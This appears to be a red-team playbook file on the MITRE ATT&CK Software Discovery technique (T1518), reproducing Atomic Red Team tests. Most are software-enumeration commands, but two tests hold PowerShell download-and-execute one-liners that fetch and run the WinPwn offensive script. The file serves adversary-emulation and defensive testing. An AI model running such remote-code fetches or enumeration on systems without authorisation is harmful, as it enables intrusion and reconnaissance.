---
name: "T1518_software-discovery"
description: "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1518
  - discovery
  - esxi
  - iaas
  - linux
  - macos
  - windows
technique_id: "T1518"
tactic: "discovery"
all_tactics:
  - discovery
platforms:
  - ESXi
  - IaaS
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1518"
tech_stack:
  - esxi
  - cloud
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-200
chains_with:
  - T1518.001
  - T1518.002
prerequisites: []
severity_boost:
  T1518.001: "Chain with T1518.001 for deeper attack path"
  T1518.002: "Chain with T1518.002 for deeper attack path"
---

# T1518 Software Discovery

## High-Level Description

Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Such software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.

Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.

## Kill Chain Phase

- Discovery (TA0007)

**Platforms:** ESXi, IaaS, Linux, macOS, Windows

## What to Check

- [ ] Identify if Software Discovery technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Software Discovery
- [ ] Check IaaS systems for indicators of Software Discovery
- [ ] Check Linux systems for indicators of Software Discovery
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Find and Display Internet Explorer Browser Version

Query the registry to determine the version of internet explorer installed on the system.
Upon execution, version information about internet explorer will be displayed.

**Supported Platforms:** windows

```cmd
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer" /v svcVersion
```

### Atomic Test 2: Applications Installed

Query the registry to determine software and versions installed on the system. Upon execution a table of
software name and version information will be displayed.

**Supported Platforms:** windows

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
```

### Atomic Test 3: Find and Display Safari Browser Version

Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors

**Supported Platforms:** macos

```bash
/usr/libexec/PlistBuddy -c "print :CFBundleShortVersionString" /Applications/Safari.app/Contents/Info.plist
/usr/libexec/PlistBuddy -c "print :CFBundleVersion" /Applications/Safari.app/Contents/Info.plist
```

### Atomic Test 4: WinPwn - Dotnetsearch

Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Dotnetsearch -noninteractive -consoleoutput
```

### Atomic Test 5: WinPwn - DotNet

Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
dotnet -consoleoutput -noninteractive
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Software Discovery by examining the target platforms (ESXi, IaaS, Linux).

2. **Assess Existing Defenses**: Review whether mitigations for T1518 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Multi-Platform Software Discovery Behavior Chain

## Risk Assessment

| Finding                                 | Severity | Impact    |
| --------------------------------------- | -------- | --------- |
| Software Discovery technique applicable | High     | Discovery |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [Atomic Red Team - T1518](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1518)
- [MITRE ATT&CK - T1518](https://attack.mitre.org/techniques/T1518)
